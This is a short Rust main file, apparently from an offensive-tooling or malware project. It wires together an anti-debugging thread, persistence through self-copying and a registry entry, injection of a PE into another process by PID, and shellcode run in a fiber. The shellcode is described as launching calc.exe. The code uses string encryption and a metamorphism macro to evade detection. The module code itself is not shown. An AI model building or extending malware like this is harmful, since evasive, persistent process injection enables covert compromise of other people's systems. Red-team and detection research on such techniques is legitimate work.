extern crate alloc;
extern crate litcrypt2;

mod evasion;
mod persistence;
mod process;

use crate::process::{pe::pe, pid::pid, shellcode::SHELLCODE};
use litcrypt2::use_litcrypt;
use yharnam::metamorphism;
use_litcrypt!();

#[metamorphism]
fn main() {
    evasion::debugger::thread();

    if let Err(e) = persistence::copy::copy() {
        eprintln!("[!] Copy error: {:?}", e);
    }
    if let Err(e) = persistence::registry::registry() {
        eprintln!("[!] Registry error: {:?}", e);
    }

    if let Some(pid) = pid() {
        let pe_handle = std::thread::spawn(move || {
            println!("[*] Starting PE injection into PID: {}", pid);
            pe(pid);
        });
        // Avoid silent failed
        let _ = pe_handle.join();

        let fiber_handle = std::thread::spawn(move || {
            println!("[*] Starting calc.exe from shellcode into fiber");
            process::fiber::fiber(SHELLCODE.as_ptr() as *const _);
        });
        let _ = fiber_handle.join();
    } else {
        eprintln!("[!] Process not found");
    }
}
